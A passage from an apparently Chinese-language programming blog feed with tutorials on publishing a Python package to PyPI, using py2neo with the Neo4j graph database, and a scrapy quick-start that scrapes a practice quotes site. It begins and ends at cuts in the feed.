title="打包发布到PYPI"></a>打包发布到PYPI</h2><p>到前面为止，必须的文件我们已经创建完毕，下面就是如何打包和发布的过程。</p><h3 id="打包项目"><a href="#打包项目" class="headerlink" title="打包项目"></a>打包项目</h3><p>在总目录下执行如下代码<br><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">python setup.py sdist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>这时候就会生成一个dist目录，如下所示：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuZ2VudGxlY3AuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy81ZTk5NjdhMDI3ZDBmLnBuZw#pic_center =400x200" alt="">  </p><h3 id="发布到PYPI"><a href="#发布到PYPI" class="headerlink" title="发布到PYPI"></a>发布到PYPI</h3><ul><li><p>先点击<a href="https://pypi.org/account/register/">这里</a>注册一个pypi账号</p><blockquote><p>需要验证邮箱</p></blockquote></li><li><p>用<code>twine</code>模块上传到pypi  </p>  <div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">twine upload dist&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>  <img src="https://img-blog.csdnimg.cn/20200419164925896.png#pic_center =400x80" alt=""></p><blockquote><p>如果没有twine，用<code>pip install twine</code></p></blockquote></li></ul><h3 id="查看我们的项目"><a href="#查看我们的项目" class="headerlink" title="查看我们的项目"></a>查看我们的项目</h3><p>到<a href="https://pypi.org/search/?q=cptools">pypi</a>上搜索<code>cptools</code><br><img src="https://img-blog.csdnimg.cn/20200419164946313.png#pic_center =400x200" alt=""></p><blockquote><p>这时候说明我们可以用<code>pip install cptools</code>安装我们的模块了</p></blockquote><h2 id="测试模块使用"><a href="#测试模块使用" class="headerlink" title="测试模块使用"></a>测试模块使用</h2><ul><li><code>pip install cptools</code><br>  <img src="https://img-blog.csdnimg.cn/20200419165008503.png#pic_center =400x200" alt=""></li><li>调用函数<br>  <img src="https://img-blog.csdnimg.cn/20200419165019581.png#pic_center =400x100" alt=""></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，一个完整的python包编写发布过程就结束了，以后有新的内容发布了依然是用相同的方法更新到pypi使用即可，不过记得更新你的版本号和github内容哦～</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>pypi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>py2neo 快速上手</title>
    <link href="/article/53311.html"/>
    <url>/article/53311.html</url>
    
    <content type="html"><![CDATA[<h1 id="py2neo-快速上手"><a href="#py2neo-快速上手" class="headerlink" title="py2neo 快速上手"></a>py2neo 快速上手</h1><h2 id="py2neo简介"><a href="#py2neo简介" class="headerlink" title="py2neo简介"></a>py2neo简介</h2><p><code>neo4j</code> 是目前最流行的图数据库，在建立知识图谱的时候经常用于数据的存储和检索，<code>neo4j</code> 相较<code>mysql</code> 等其他关系型数据库最大的特点就是非常容易查看数据与数据之间的联系，它将所有数据转换成<strong>图</strong>的形式，让使用者能够快速发现蕴含的联系。下面是<code>neo4j</code> 的主要界面和相应的数据图例（射雕英雄传人物知识图谱）。</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210219123737.png" alt="image-20210219123737557"></p><p>但是，直接地对<code>neo4j</code>操作，虽然有相应的<code>cypher</code>语句，却并不适合在编程的过程中操作。<code>py2neo</code>就是一个连接了<code>python</code>到<code>neo4j</code>数据库的库，它不仅让程序本身可以直接执行<code>cypher</code>语句创建图数据库，也提供了更人性化的操作，符合面向对象编程的思想。</p><h2 id="neo4j"><a href="#neo4j" class="headerlink" title="neo4j"></a>neo4j</h2><p>在进入使用<code>py2neo</code>之前，还是要先安装好<code>neo4j</code>，了解一些基础的<code>cypher</code>语句用法（虽然我自己基本不怎么用它），然而<code>neo4j</code>的介绍不是本文的重点，网上已有大篇幅的文章去讲述怎么使用它。因此，这里我会给出必要的操作步骤（避免再去看冗长的文档）和我个人推荐的博客文章（包含更为详细的说明）。</p><h3 id="安装与启动"><a href="#安装与启动" class="headerlink" title="安装与启动"></a>安装与启动</h3><ul><li>安装</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;neo4j.com&#x2F;artifact.php?name&#x3D;neo4j-community-3.4.1-unix.tar.gztar -zxvf neo4j-community-3.4.1.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><blockquote><p>安装的环境建议放在linux系统下，这是我个人的爱好也是一个建议（所有部署的服务、数据库等东西都放到linux系统中），不仅仅是安装更加方便，同时也可以避免后续许多的不便，如果你主力系统是windows，那么虚拟机+网络桥接模式是一个不错的选择</p></blockquote><ul><li>启动</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">cd <span class="token builtin">bin</span><span class="token operator">/</span> <span class="token punctuation">.</span><span class="token operator">/</span>neo4j start   <span class="token comment"># console | start | stop | restart | status</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p>当发现启动成功后，进入<code>http://localhost:7474</code></p><ul><li>推荐阅读文献<ul><li><a href="https://juejin.cn/post/6844904180906197006">https://juejin.cn/post/6844904180906197006</a></li><li><a href="https://zhuanlan.zhihu.com/p/88745411">https://zhuanlan.zhihu.com/p/88745411</a></li></ul></li></ul><h2 id="py2neo使用"><a href="#py2neo使用" class="headerlink" title="py2neo使用"></a>py2neo使用</h2><blockquote><p>py2neo支持直接执行<code>cypher</code>语句，如果你对<code>cypher</code>语句熟悉的话，将你要执行的操作转换成<code>cypher</code>语句，再让<code>py2neo</code>执行或许是不错的选择，否则，我更推荐你使用<code>py2neo</code>提供的接口</p></blockquote><ul><li><a href="https://py2neo.org/v4/">官方文档</a></li></ul><h3 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h3><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> py2neo <span class="token keyword">import</span> <span class="token operator">*</span>NEO4J_URL <span class="token operator">=</span> <span class="token string">'http://localhost:7474'</span>NEO4J_USERNAME <span class="token operator">=</span> <span class="token string">'neo4j'</span>NEO4J_PASSWORD <span class="token operator">=</span> <span class="token string">'123456'</span>graph <span class="token operator">=</span> Graph<span class="token punctuation">(</span>NEO4J_URL<span class="token punctuation">,</span> username<span class="token operator">=</span>NEO4J_USERNAME<span class="token punctuation">,</span> password<span class="token operator">=</span>NEO4J_PASSWORD<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><h4 id="创建节点"><a href="#创建节点" class="headerlink" title="创建节点"></a>创建节点</h4><p>节点的定义由 <code>Node</code> 实现，要将其添加到 <code>neo4j</code> 数据库中则可通过 <code>create</code> 或 <code>merge</code> 方法实现，两者都可创建节点，但有些许的不同：</p><ul><li><code>create(node)</code> ：即便是属性值相同的同一节点，在调用 <code>create</code> 之后也会创建一个新节点</li><li><code>merge(node, &quot;node_label&quot;, &quot;main_attr&quot;)</code> ：主要是 <code>main_attr</code> （主属性）一样，就视作同一节点，对改节点做的任何更改在 <code>merge</code> 的时候都会覆盖已有的节点 </li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">node0 <span class="token operator">=</span> Node<span class="token punctuation">(</span><span class="token string">'Person'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Alice'</span><span class="token punctuation">)</span>  <span class="token comment"># 直接指定属性</span><span class="token comment"># 通过属性dict创建</span>person_info <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Jhon'</span><span class="token punctuation">&#125;</span>    node1 <span class="token operator">=</span> Node<span class="token punctuation">(</span><span class="token string">'Person'</span><span class="token punctuation">,</span> <span class="token operator">**</span>person_info<span class="token punctuation">)</span>graph<span class="token punctuation">.</span>create<span class="token punctuation">(</span>node0<span class="token punctuation">)</span>   <span class="token comment"># create创建节点，如果不做检查，总是会创建新节点</span>graph<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>node1<span class="token punctuation">,</span><span class="token string">'Person'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">)</span>   <span class="token comment"># 如果节点已存在则覆盖(只要同一key)，需要指定primarykey和primarylabel</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h4 id="查找节点"><a href="#查找节点" class="headerlink" title="查找节点"></a>查找节点</h4><ul><li>精确查找（根据指定属性）</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">matcher <span class="token operator">=</span> NodeMatcher<span class="token punctuation">(</span>graph<span class="token punctuation">)</span>matcher<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">"Person"</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"Alice"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># 返回node</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><div class="table-container"><table><thead><tr><th><strong>描述</strong></th><th><strong>后缀</strong></th><th><strong>表达式</strong></th><th><strong>示例</strong></th><th><strong>cypher语句</strong></th></tr></thead><tbody><tr><td>相等</td><td>__exact</td><td>=</td><td>matcher.match(“Person”, name__exact=”Kevin Bacon”)</td><td>MATCH (<em>:Person) WHERE name = “Kevin Bacon” RETURN </em></td></tr><tr><td>不等</td><td>__not</td><td>&lt;&gt;</td><td>matcher.match(“Person”, name__not=”Rick Astley”)</td><td>MATCH (<em>:Person) WHERE </em>.name &lt;&gt; “Rick Astley” RETURN _</td></tr><tr><td>大于</td><td>__gt</td><td>&gt;</td><td>matcher.match(“Person”, born__gt=1985)</td><td>MATCH (<em>:Person) WHERE </em>.born &gt; 1985 RETURN _</td></tr><tr><td>大于等于</td><td>__gte</td><td>&gt;=</td><td>matcher.match(“Person”, born__gte=1965)</td><td>MATCH (<em>:Person) WHERE </em>.born &gt;= 1965 RETURN _</td></tr><tr><td>小于</td><td>__lt</td><td>&lt;</td><td>matcher.match(“Person”, born__lt=1965)</td><td>MATCH (<em>:Person) WHERE </em>.born &lt; 1965 RETURN _</td></tr><tr><td>小于等于</td><td>__lte</td><td>&lt;=</td><td>matcher.match(“Person”, born__lte=1965)</td><td>MATCH (<em>:Person) WHERE </em>.born &lt;= 1965 RETURN _</td></tr><tr><td>以…开头</td><td>__startswith</td><td>STARTS WITH</td><td>matcher.match(“Person”, name__startswith=”Kevin”)</td><td>MATCH (<em>:Person) WHERE </em>.name STARTS WITH “Kevin” RETURN _</td></tr><tr><td>以…结尾</td><td>__endswith</td><td>ENDS WITH</td><td>matcher.match(“Person”, name__endswith=”Smith”)</td><td>MATCH (<em>:Person) WHERE </em>.name ENDS WITH “Smith” RETURN _</td></tr><tr><td>包含</td><td>__contains</td><td>CONTAINS</td><td>matcher.match(“Person”, name__contains=”James”)</td><td>MATCH (<em>:Person) HWERE </em>.name CONTAINS “James” RETURN _</td></tr></tbody></table></div><ul><li>模糊查找（根据正则表达式）</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">list(matcher.match(&quot;Person&quot;).where(&quot;_.name &#x3D;~ &#39;K.*&#39;&quot;))  # _指代节点，~代表采用正则表达式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><ul><li>查找结果排序与限制</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">list(matcher.match(&quot;Person&quot;).where(&quot;_.name &#x3D;~ &#39;K.*&#39;&quot;).order_by(&quot;_.name&quot;).limit(3))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><ul><li>查找结果个数</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">len(matcher.match(&quot;Person&quot;).where(&quot;_.name &#x3D;~ &#39;K.*&#39;&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><ul><li>跳过前n个查找结果</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">list(matcher.match(&quot;Person&quot;).where(&quot;_.name &#x3D;~ &#39;K.*&#39;&quot;).skip(3))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><h4 id="节点属性与标签"><a href="#节点属性与标签" class="headerlink" title="节点属性与标签"></a>节点属性与标签</h4><ul><li>属性操作</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">node[key] &#x3D; value   # 给节点属性赋值del node[key]   # 删除节点属性len(node)   # 节点属性的个数dict(node)  # 返回字典，包括了该节点的所有属性node.identity   # 返回节点id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li>标签操作</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">node.labels     # 返回节点的所有标签labelA in node.labels   # 如果节点具有标签labelA，返回Truenode.labels.add(labelB)     # 给节点增加标签labelBnode.labels.discard(labelC)     # 删除节点标签labelCnode.labels.remove(labelC)  # 同上，但是如果labelC不存在的话会返回ValueErrornode.labels.clear()     # 清除节点所有标签node.labels.update(manylabels)  # 从可迭代对象manylabels中给节点增加多个标签<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h3><h4 id="创建关系"><a href="#创建关系" class="headerlink" title="创建关系"></a>创建关系</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">properties &#x3D; &#123;    &#39;year&#39; : 1999&#125;ab &#x3D; Relationship(node_a,&#39;knows&#39;, node_b, )  # 后面还可以传入关系的属性字典aa &#x3D; Relationship(node_a,&#39;like&#39;)ab[&#39;time&#39;] &#x3D; &#39;2019&#x2F;01&#x2F;01&#39;  # 给关系添加属性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h4 id="查找关系"><a href="#查找关系" class="headerlink" title="查找关系"></a>查找关系</h4><ul><li>查找所有指定类型的关系</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">matcher&#x3D;RelationshipMatcher(graph)list(matcher.match(r_type&#x3D;&#39;KNOWS&#39;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><ul><li>查找指定起始节点或终点的关系</li></ul><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">relation_matcher &#x3D; RelationshipMatcher(graph)result &#x3D; relation_matcher.match((node,), &#39;父亲&#39;).first()  # 注意这里的node需要先按照nodematcher.match得到<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><blockquote><p>(node,) 也可以是{node}</p></blockquote><h4 id="关系属性"><a href="#关系属性" class="headerlink" title="关系属性"></a>关系属性</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">relationshipA &#x3D;&#x3D; relationshipBrelationshipA !&#x3D; relationshipB  # 判断两个关系是否相等，但是和节点不同，这里只要起始、终止节点和关系类型相同，就判定两个关系相等del relationship[key]   # 删除属性len(relationship)   # 返回属性个数dict(relationship)  # 返回字典，包括所有属性type(relationship)  # 返回关系的类型relationship.nodes   # 返回关系中的所有节点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h3 id="OGM"><a href="#OGM" class="headerlink" title="OGM"></a>OGM</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">from py2neo.ogm import GraphObject, RelatedTo, RelatedFromclass Movie(GraphObject):    __primarykey__ &#x3D; &quot;title&quot;    title &#x3D; Property()    tag_line &#x3D; Property(&quot;tagline&quot;)    released &#x3D; Property()    actors &#x3D; RelatedFrom(&quot;Person&quot;, &quot;ACTED_IN&quot;)    directors &#x3D; RelatedFrom(&quot;Person&quot;, &quot;DIRECTED&quot;)    producers &#x3D; RelatedFrom(&quot;Person&quot;, &quot;PRODUCED&quot;)class Person(GraphObject):    __primarykey__ &#x3D; &quot;name&quot;    name &#x3D; Property()  # Property(key&#x3D;&#39;姓名&#39;, default&#x3D;&#39;Tom&#39;)    born &#x3D; Property()    acted_in &#x3D; RelatedTo(Movie)  # RelatedTo(Movie,relationship_type&#x3D;&#39;ACTED_IN&#39;), 类名引号可用可不用    directed &#x3D; RelatedTo(Movie)    produced &#x3D; RelatedTo(Movie)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h4 id="查找节点-1"><a href="#查找节点-1" class="headerlink" title="查找节点"></a>查找节点</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">Person.match(graph, &quot;Alice&quot;).first()list(Person.match(graph).where(&quot;_.name &#x3D;~ &#39;A.*&#39;&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h4 id="属性-amp-操作"><a href="#属性-amp-操作" class="headerlink" title="属性&amp;操作"></a>属性&amp;操作</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">alice &#x3D; Person()alice.name &#x3D; &quot;Alice Smith&quot;graph.push(alice)  # 不需要create&#x2F;merge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h4 id="创建关系-1"><a href="#创建关系-1" class="headerlink" title="创建关系"></a>创建关系</h4><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">cp &#x3D; Person()cp.name &#x3D; &#39;cp&#39;m1 &#x3D; Movie()m1.title &#x3D; &#39;煎饼侠&#39;cp.acted_in.add(m1)  # 添加cp-&gt;acted_in -&gt;m1， add有参数，可用于传入关系的属性，直接传入字典或**dict # cp.acted_in.remove(m1)  # 移除关系graph.push(cp)graph.push(m1)# adddef add(self, obj, properties&#x3D;None, **kwproperties):    &quot;&quot;&quot; Add or update a related object.    :param obj: the :py:class:&#96;.Model&#96; to relate    :param properties: dictionary of properties to attach to the relationship (optional)    :param kwproperties: additional keyword properties (optional)    &quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>RelatedTo是主动的，RelatedFrom是被动的，因此只需要添加RelatedTo关系（cp.acted_in.add(m1)），就可用查询相应m1.actors</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>py2neo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>scrapy 快速上手</title>
    <link href="/article/52452.html"/>
    <url>/article/52452.html</url>
    
    <content type="html"><![CDATA[<h1 id="Scrapy快速上手"><a href="#Scrapy快速上手" class="headerlink" title="Scrapy快速上手"></a>Scrapy快速上手</h1><h2 id="scrapy简介"><a href="#scrapy简介" class="headerlink" title="scrapy简介"></a>scrapy简介</h2><p><code>scrapy</code>是一款爬虫框架，相比于一般的基于<code>requests</code> 自行编写的爬虫，其特点主要包括：</p><ul><li><strong>系统化&amp;结构化</strong>：这意味着你编写的代码能够有很高的扩展性，维护更加容易，对于不擅长设计项目架构的童鞋帮助很大</li><li><strong>高效率</strong>：<code>scrapy</code> 让你在编写程序的同时不需要考虑许多性能上的东西（例如多线程），这些<code>scrapy</code> 都已为你考虑好了，你真正需要关注的是爬虫的解析部分</li><li><strong>一步到位</strong>：这里指的是一个完整的爬虫工作，包括页面下载-&gt;解析-&gt;过滤-&gt;存储几个基本步骤，<code>scrapy</code>都存在相应的模块进行处理，并且这些步骤之间的衔接也由<code>scrapy</code>完成，让你摆脱数据在不同阶段传输的焦虑</li></ul><p><code>scrapy</code>官方文档对于scrapy有着非常鲜明的解释了，包括<strong>一个基础的教程</strong>，<strong>各个模块具体的功能</strong>，以及一些<strong>高级操作</strong>，本文档的目的旨在：<strong>快速上手，略过一些不必要的细节，实现让一个小白也能根据文档快速实现利用<code>scrapy</code>实现一个完整的爬虫。</strong></p><ul><li><a href="https://docs.scrapy.org/en/latest/intro/tutorial.html">官方文档</a></li><li><a href="https://scrapy-docs.readthedocs.io/zh/latest/intro/tutorial.html">中文文档</a></li></ul><h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><blockquote><p>快速上手一个项目的方式就是跑通一个小例子，一方面简洁的程序能更容易理解，另一方面跑通程序能够提高我们对项目的研究兴趣，下面的例子实现的功能是访问请求：<a href="http://quotes.toscrape.com/page/1/，将该页面每个方框内的**文字、作者、标签**信息提取出来，并存储成`json">http://quotes.toscrape.com/page/1/，将该页面每个方框内的**文字、作者、标签**信息提取出来，并存储成`json</a> lines`的形式。</p></blockquote><ul><li>创建一个<code>scrapy</code>项目：<code>scrapy startproject tutorial</code>，你将得到如下结构的项目，目前不必纠结每个文件目录是干什么的</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">tutorial<span class="token operator">/</span>    scrapy<span class="token punctuation">.</span>cfg            <span class="token comment"># deploy configuration file</span>    tutorial<span class="token operator">/</span>             <span class="token comment"># project's Python module, you'll import your code from here</span>        __init__<span class="token punctuation">.</span>py        items<span class="token punctuation">.</span>py          <span class="token comment"># project items definition file</span>        middlewares<span class="token punctuation">.</span>py    <span class="token comment"># project middlewares file</span>        pipelines<span class="token punctuation">.</span>py      <span class="token comment"># project pipelines file</span>        settings<span class="token punctuation">.</span>py       <span class="token comment"># project settings file</span>        spiders<span class="token operator">/</span>          <span class="token comment"># a directory where you'll later put your spiders</span>            __init__<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><ul><li>在根目录下创建一个<code>spider</code> (针对每一个不同的网站都要创建一个<code>spider</code>) ：<code>scrapy genspider quotes quotes.toscrape.com</code>,这会在<code>spiders</code>下创建一个新的文件，包含以下内容：</li></ul><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy<span class="token keyword">class</span> <span class="token class-name">QuotesSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">"quotes"</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'http://quotes.toscrape.com/page/1/'</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>这里有一些需要解释的，<code>start_urls</code> 是一个列表，包含了我们需要爬取的网址，同时也是起始网址，可以理解为爬虫入口，很多爬虫会从起始网址开始，一步步提取出更多的网址并进一步爬取，但是在这个例子中，我们只考虑单个网址。<code>parse</code> 是一个解析方法，它有一个参数<code>response</code> ，就是爬取<code>start_urls</code> 列表中的网址后得到的结果，你可以理解为<code>response=requests.get(url=start_requests[i]), i=0,1,2...</code>  ，<strong>注意</strong>，爬虫的核心代码就是从网页中解析出我们需要的数据，因此在你的爬虫文件中编写的其他函数（例如<code>parse_authro(self, response)</code>），应该也遵照这个思想：接收response，解析数据，<code>yield</code> 新请求。有点扯远了，继续下一步</p></blockquote><ul><li>我们需要从<code>response</code>中解析出方框的内容，这来源于我们对于网页源代码的观察，如下图：</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210203181417.png" alt="image-20210203181416969" style="zoom:50%;" /></p><p>容易发现每个方框都是一个<code>class=&quot;quote&quot;</code> 的<code>div</code>标签，因此我们可以用如下的代码去解析其中的数据（代码运用了<code>css</code>解析，后面会详解，这里了解一下就好）</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy<span class="token keyword">class</span> <span class="token class-name">QuotesSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">"quotes"</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'http://quotes.toscrape.com/page/1/'</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> quote <span class="token keyword">in</span> response<span class="token punctuation">.</span>css<span class="token punctuation">(</span><span class="token string">'div.quote'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">yield</span> <span class="token punctuation">&#123;</span>                <span class="token string">'text'</span><span class="token punctuation">:</span> quote<span class="token punctuation">.</span>css<span class="token punctuation">(</span><span class="token string">'span.text::text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">'author'</span><span class="token punctuation">:</span> quote<span class="token punctuation">.</span>css<span class="token punctuation">(</span><span class="token string">'small.author::text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">'tags'</span><span class="token punctuation">:</span> quote<span class="token punctuation">.</span>css<span class="token punctuation">(</span><span class="token string">'div.tags a.tag::text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>上面的代码让我们遍历所有<code>div</code>标签，并从中提取出三个字段的内容，至此，我们的爬虫解析部分就写好了</p></blockquote><ul><li>运行我们的爬虫很容易，直接执行代码:<code>scrapy crawl quotes -o res.jl</code>就可以看到我们的数据了</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210203182053.png" alt="image-20210203182053647" style="zoom:50%;" /></p><h2 id="scrapy运作机制"><a href="#scrapy运作机制" class="headerlink" title="scrapy运作机制"></a>scrapy运作机制</h2><p>pass</p><h2 id="scrapy选择器：css与xpath使用"><a href="#scrapy选择器：css与xpath使用" class="headerlink" title="scrapy选择器：css与xpath使用"></a>scrapy选择器：css与xpath使用</h2><blockquote><p>css&amp;xpath是scrapy中<code>response</code>解析提取数据的两种主要方式，在此之前，你一定用过例如<code>Beautifulsoup</code> 进行网页文本数据的解析，相比之下，<code>scrapy</code>内置的解析器效率要更高，因此强烈建议将这两种解析方法都掌握。下面的列表不会像官网一样一步步教你解析，更多的是一种功能式的查询，即回答<strong>我该怎么样获取我想要的数据</strong>的问题。</p></blockquote><h3 id="查找指定标签文本"><a href="#查找指定标签文本" class="headerlink" title="查找指定标签文本"></a>查找指定标签文本</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.css(&#39;a::text&#39;)     response.xpath(&#39;&#x2F;&#x2F;a&#x2F;text()&#39;)   # 有多个标签返回多个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h3 id="查找指定标签的属性"><a href="#查找指定标签的属性" class="headerlink" title="查找指定标签的属性"></a>查找指定标签的属性</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.css(&#39;a::attr(href)&#39;)response.xpath(&#39;&#x2F;&#x2F;a&#x2F;@href&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h3 id="查找指定属性为指定值的标签"><a href="#查找指定属性为指定值的标签" class="headerlink" title="查找指定属性为指定值的标签"></a>查找指定属性为指定值的标签</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.css(&#39;a[href&#x3D;&quot;xxx&quot;]&#39;)   # 获取属性href&#x3D;xxx的a标签response.xpath(&#39;&#x2F;&#x2F;a[@href&#x3D;&quot;xxx&quot;]&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h3 id="查找指定属性包含指定值的标签"><a href="#查找指定属性包含指定值的标签" class="headerlink" title="查找指定属性包含指定值的标签"></a>查找指定属性包含指定值的标签</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.css(&#39;a[href*&#x3D;&quot;xxx&quot;]&#39;)response.xpath(&#39;a[contains(@href, &quot;xxx&quot;)]&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h3 id="查找文本为指定值的标签"><a href="#查找文本为指定值的标签" class="headerlink" title="查找文本为指定值的标签"></a>查找文本为指定值的标签</h3><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">response.xpath(&#39;&#x2F;&#x2F;a[text()&#x3D;&quot;xxx&quot;]&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><h3 id="查找文本包含指定值的标签"><a 